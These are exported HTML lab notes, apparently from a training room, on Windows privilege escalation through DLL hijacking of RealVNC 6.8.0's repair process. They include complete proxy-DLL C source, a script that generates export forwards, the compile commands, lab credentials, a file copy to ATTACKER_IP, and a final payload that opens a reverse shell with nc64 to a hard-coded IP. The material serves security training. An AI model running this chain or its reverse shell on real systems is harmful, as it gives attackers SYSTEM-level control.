<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Abusing Vulnerable Software</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Abusing Vulnerable Software</h1><br/><strong><h1>Abusing Vulnerable Software</h1></strong><br /><br />Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the <strong>wmic</strong> tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):<br /><br /><strong>wmic product get name,version,vendor</strong><br /><br />Remember that the <strong>wmic product </strong>command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.<br /><br />Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like <strong>exploit-db</strong>, <strong>packet storm </strong>or <strong>plain old Google</strong>, amongst many others.<br /><br />Using wmic and Google, can you find a known vulnerability on any installed product?<br /><br />Make sure to click the Start Machine button before you continue to deploy the target machine in split-view. If you prefer connecting to the machine via RDP, you can use the following credentials:<br /><br /><strong>User: thm-unpriv<br />Password: Password321<br /></strong><br /><br /><strong><h2>Case study: RealVNC 6.8.0</h2></strong><br /><br />The target server is running RealVNC 6.8.0, which has been found vulnerable to privilege escalation via DLL hijacking by Triskele Labs. DLL hijacking consists of finding an application that tries to load a DLL library and trick it into loading a malicious DLL instead of the expected one, gaining the privileges of the application&#39;s process.<br /><br />To better understand how this works, let&#39;s start by introducing DLL files.<br /><br /><br /><strong><h3>Intro to DLLs</h3></strong><br /><br />DLL stands for Dynamic-Link Libraries. DLLs provide a way to define code that can be reused across many applications. In its simplest form, DLLs are collections of functions that can be called from any executable linked against the DLL. The functions that a DLL makes available to the world are known as Exports. In this way, any application that requires using a function available in a DLL doesn&#39;t have to re-implement it but just call it from the DLL.<br /><br /><img src="images/215-1.png" alt="images/215-1.png" /><br /><br />A DLL also includes a DllMain() function that acts as the Dll Entry Point and is called whenever a process or thread attaches or detaches from the DLL. This function is used to perform any initialisation when the DLL is loaded and any cleanup tasks when the DLL is unloaded.<br /><br /><br /><strong><h3>DLL Loading Process</h3></strong><br /><br />An application can link to a DLL in two ways, depending on the use case:<br /><br /><strong><h4>Load-Time Dynamic Linking:</h4></strong><h4> </h4><br />The DLL is loaded when the application is started. This is normally used when an application depends on a DLL to work. In this case, the loading process is as follows:<br />        <br />        ★	The DLL will be searched on the system using the DLL Search Order (more on this later). If the DLL isn&#39;t available, the application fails to launch.<br />        ★	The process then checks the DLL&#39;s export table to see if it implements all the required methods. If any required method is missing, the application fails to load.<br />        ★	If all the required methods are available, the application calls the DLLMain() function from the DLL and continues execution.<br />    <br /><br /><strong><h4>Run-Time Dynamic Linking:</h4></strong><h4> </h4><br />The DLL is linked at run-time, which is helpful for implementing optional features on your application that depend on third-party libraries, for example. In this case, the process is as follows:<br />        <br />        ★	The DLL will be searched on the system using the DLL Search Order. If the DLL doesn&#39;t exist, the application can decide to continue execution without crashing.<br />        ★	If the DLL file exists, the DLLMain() function from the DLL is called, and the application continues its normal execution.<br />        ★	Since no checks are made against the export table of the DLL, the application might end up trying to call functions not implemented on the DLL. The application can decide how to handle this to continue execution if required.<br /><br /><br /><strong>Independent on the way the DLL is linked, when loading a DLL, the following will occur:</strong><br /><br />    ★	By default, before attempting to search for a DLL on the file system, Windows will check if the DLL has already been loaded by the application, in which case it won&#39;t load it again.<br />    ★	Windows will then check the name of the requested DLL against a list of known DLLs. Windows will load known DLLs directly from the system folders.<br />    ★	Windows will use the standard DLL Search Order to find the correct DLL to load. The DLL Search Order states the order in which the operating system will check specific directories in search of the required DLL. This is needed because more than one copy of a DLL on a given system might exist.<br /><br /><img src="images/215-2.png" alt="images/215-2.png" /><br /><br />From all the steps in the DLL Search Order, attackers are primarily interested in the ones marked in red, as they might allow them to insert DLLs of their own on the execution flow of other applications.<br /><br /><br /><strong><h3>Exploiting RealVNC 6.8.0</h3></strong><br /><br />RealVNC 6.8.0 allows unprivileged users to &quot;repair&quot; the software if needed in case of failures. This is handled by MSIExec.exe, the process in charge of .msi packages installations, which runs with SYSTEM privileges. When repairing RealVNC, MSIExec performs the following actions:<br /><br /><img src="images/215-3.png" alt="images/215-3.png" /><br /><br />  	<br />  	▪	Copy some files to the user&#39;s temp folder, located at <strong>C:\Users\&lt;username&gt;\AppData\Local\Temp\</strong>. This includes a copy of the vncserver executable named <strong>vncserver-old.exe</strong>. Notice that if an unprivileged user requests the repair, they hold complete control over their temp folder.<br />    ▪	MSIExec then executes <strong>vncserver-old.exe</strong> using SYSTEM privileges, which loads <strong>adsldpc.dll</strong>. Windows will follow the standard DLL search order and finds the DLL in <strong>C:\Windows\System32\adsldpc.dll</strong>.<br /><br />Since we have write access to our temp folder, we can create a malicious DLL called <strong>adsldpc.dll</strong> on the application&#39;s directory. According to the DLL search order, as the application&#39;s directory has precedence over <strong>C:\Windows\System32</strong>, our DLL would get loaded instead of the original one, effectively hijacking the DLL.<br /><br /><img src="images/215-4.png" alt="images/215-4.png" /><br /><br />All that remains is building a custom DLL and injecting our desired payload in the DLLMain() function so that it gets executed when the process loads it.<br /><br />Notice, however, that the malicious DLL must provide all of the exports available in the original one, as we are dealing with a load-time linked library. Therefore, the program will check the DLL exports table before executing the DLLMain() function. While we could make a DLL with empty exports, this would likely crash the application after running our payload. To avoid this, we will create a Proxy DLL, which will forward any exported function calls back to the original DLL.<br /><br /><br /><strong><h3>Creating a Proxy DLL</h3></strong><br /><br />While in a regular DLL, the export table contains pointers to functions contained in the same DLL, proxy DLLs&#39; export table will have forwarders pointing to functions on a different DLL.<br /><br /><img src="images/215-5.png" alt="images/215-5.png" /><br /><br />To create a proxy DLL, we&#39;ll need to create <strong>two</strong> files:<br /><br />    ▪	<strong>proxy.c</strong>: A standard C implementation of a DLL. The only method implemented will be the DLLMain() function, containing our payload.<br /><br /><em><strong>#include &lt;windows.h&gt;<br /><br />BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)<br />{<br />    if (fdwReason == DLL_PROCESS_ATTACH) {<br />            system(&quot;whoami &gt; C:\\output.txt&quot;);<br />    }<br /><br />    return TRUE;<br />}</strong></em><br /><br />    ▪	<strong>proxy.def</strong>: A definition file to pass to the linker, where we will specify all of the export forwards back to the original DLL. The structure of the file will hold a line for each export where we will indicate the name of the export, followed by the DLL and method name where the calls will be forwarded, followed by an ordinal that specifies in which position of the export table will the method be:<br /><br /><em><strong>EXPORTS<br />    Method1=C:/Windows/System32/original.dll.Method1 @1<br />    Method2=C:/Windows/System32/original.dll.Method2 @2<br /></strong></em><br />Before compiling our final DLL, we need a list of all the exports available in the original DLL. To this end, let&#39;s copy the original DLL in <strong>C:\Windows\System32\adsldpc.dll</strong> to our Attacker machine using i<strong>mpacket&#39;s</strong> <strong>smbserver.py</strong> or any other means available. For smbserver.py, you can use the following command to start a simple SMB server with a network share in the current directory of our AttackBox:<br /><br /><em>Kali Linux</em><br /><strong>mkdir share</strong><br /><strong>python3.9 /opt/impacket/examples/smbserver.py -smb2support -username thm-unpriv -password Password321 public share</strong><br />        <br /><br />This will create a <strong>share</strong> named <strong>public</strong> pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the <strong>copy</strong> command in our windows machine to transfer <strong>adsldpc.dll</strong> to our AttackBox: <br /><br /><em>Command Prompt</em><br /><strong>C:\&gt; copy C:\Windows\System32\adsldpc.dll \\ATTACKER_IP\public\</strong><br /><br />        <br />We will then use a slightly modified version of the <strong>get_exports.py</strong> script from the Cobalt-Strike Github repo (<strong>https://github.com/Cobalt-Strike/ProxyDLLExample/blob/main/get_exports.py</strong>), which will extract the names of all the required <strong>exports</strong> on the original <strong>adsldpc.dll</strong> and create a .def file with all the forwards needed. The modified script&#39;s code is the following:<br /><br /><em><strong>import pefile<br />import argparse<br /><br />parser = argparse.ArgumentParser(description=&#39;Target DLL.&#39;)<br />parser.add_argument(&#39;--target&#39;, required=True, type=str,help=&#39;Target DLL&#39;)<br />parser.add_argument(&#39;--originalPath&#39;, required=True, type=str,help=&#39;Original DLL path&#39;)<br /><br />args = parser.parse_args()<br /><br />target = args.target<br />original_path = args.originalPath.replace(&#39;\\&#39;,&#39;/&#39;)<br /><br />dll = pefile.PE(target)<br /><br />print(&quot;EXPORTS&quot;, end=&quot;\r\n&quot;)<br /><br />for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:<br />    if export.name:<br />        print(f&quot;    {export.name.decode()}={original_path}.{export.name.decode()} @{export.ordinal}&quot;, end=&quot;\r\n&quot;)</strong></em><br /><br />Copy the code into a file named <strong>get_exports.py</strong> and then use it with the --target parameter to point to the original DLL and the --originalPath parameter to indicate where the original DLL resides in the target machine:<br /><br /><em>Kali Linux</em><br /><strong>python3 get_exports.py --target adsldpc.dll --originalPath &#39;C:\Windows\System32\adsldpc.dll&#39; &gt; proxy.def</strong><br /><br />The resulting <strong>proxy.def</strong> file should have around 175 exports defined and proxied.<br /><br />Now to finally create the proxy DLL, we will compile the proxy.c file and then ask the linker to use the proxy.def for export definitions. We will be using mingw-w64 to cross-compile the DLL directly from our Kali machine. If mingw-w64 isn&#39;t installed on your machine, you can use the following command to install it:<br /><br /><em>Kali Linux</em><br /><strong>sudo apt install gcc-mingw-w64-x86-64</strong><br /><br />        <br />And then compile our DLL with the following commands:<br /><br /><em>Kali Linux</em><br /><strong>x86_64-w64-mingw32-gcc -m64 -c -Os proxy.c -Wall -shared -masm=intel<br />x86_64-w64-mingw32-gcc -shared -m64 -def proxy.def proxy.o -o proxy.dll</strong><br /><br />        <br />The first command will compile <strong>proxy.c</strong> with the -c option, which won&#39;t run the linker and produce a <strong>proxy.o</strong> object file. The second command will take the <strong>proxy.o</strong> file and run it through the linker, which will also receive the <strong>proxy.def</strong> file with all of the exports we need for our proxy DLL. As a result, we will end up with the <strong>proxy.dll</strong> file we need to exploit RealVNC. Feel free to run get_exports.py into the new file to confirm it contains all the exports in the original DLL.<br /><br /><br /><strong><h3>Putting it All Together</h3></strong><br /><br />We will now copy the proxy.dll file into the target machine. Feel free to use any method you prefer for this. Once the DLL has been transferred, move it to the folder used by the repair process, changing its name to the name of the original DLL file we want to hijack:<br /><br /><em>Command Prompt</em><br /><strong>C:\&gt; move proxy.dll C:\Users\thm-unpriv\AppData\Local\Temp\adsldpc.dll</strong>   <br /><br />To trigger the RealVNC repair process, open &quot;Add or remove programs&quot; from the start menu:<br /><br /><img src="images/215-6.png" alt="images/215-6.png" /><br /><br />Search for VNC, and click the Modify button:<br /><br /><img src="images/215-7.png" alt="images/215-7.png" /><br /><br />When asked which operation to perform, choose repair:<br /><br /><img src="images/215-8.png" alt="images/215-8.png" /><br /><br />This will trigger the repair process and execute the payload in our proxy DLL. If all went well, you should now see a file on <strong>C:\output.txt</strong>.<br /><br />Modify the proxy DLL&#39;s payload with a reverse shell to get the flag for this machine. For your convenience, <strong>nc64.exe</strong> can be found at <strong>C:\tools</strong>. <br /><br /><strong><h3>Note:</h3></strong><br />Example of proxy.c with a reverse shell connection. The  &quot;<strong>\\</strong>&quot; <strong>Double backslash</strong> is very important.<br /><br /><em><strong>#include &lt;windows.h&gt;<br /><br />BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)<br />{<br />    if (fdwReason == DLL_PROCESS_ATTACH) {<br />            system(&quot;C:\\tools\\nc64 -e cmd.exe 10.11.72.31 7777&quot;);<br />    }<br /><br />    return TRUE;<br />}</strong></em><br /><br /><strong><h2>END</h2></strong><br /></div>
</body>
</html>
